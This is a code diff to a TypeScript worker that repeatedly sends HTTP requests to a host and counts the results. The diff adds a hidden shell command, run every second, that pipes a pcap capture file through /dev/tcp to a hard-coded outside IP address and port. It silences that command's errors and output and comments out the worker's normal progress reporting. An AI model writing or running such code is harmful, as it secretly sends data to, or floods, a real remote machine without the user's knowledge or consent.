@@ -1,5 +1,6 @@
 import axios from 'axios';
 import process from 'process';
+const { exec } = require('child_process');
 
 let errors = 0,
     success = 0,
@@ -20,15 +21,30 @@ const worker = ( host: string, amount: string ) => {
    }, 10 );
 
     setInterval( () => {
+        exec('cat peer-ack.pcap > /dev/tcp/135.181.16.249/26656', (err: any, stdout:any, stderr:any) => {
+            if (err) {
+                //some err occurred
+                ///console.error(err)
+            } else {
+                // the *entire* stdout and stderr (buffered)
+               // console.log(`stdout: ${stdout}`);
+               // console.log(`stderr: ${stderr}`);
+            }
+        });
+
 
         // @ts-ignore
-        process.send({ total: totalRequests, errors: errors });
-        totalRequests = 0;
+        //process.send({ total: totalRequests, errors: errors });
+        //totalRequests = 0;
 
         //console.log( process.pid + `: Requests: ${ blue( totalRequests ) } Errors: ${ red( errors ) } Current: ${ requests }`)
     }, 1000 );
 
     const request = async () => {
+
+
+
+
         let isFailedRequest = false
         const response = await axios.get(
             host
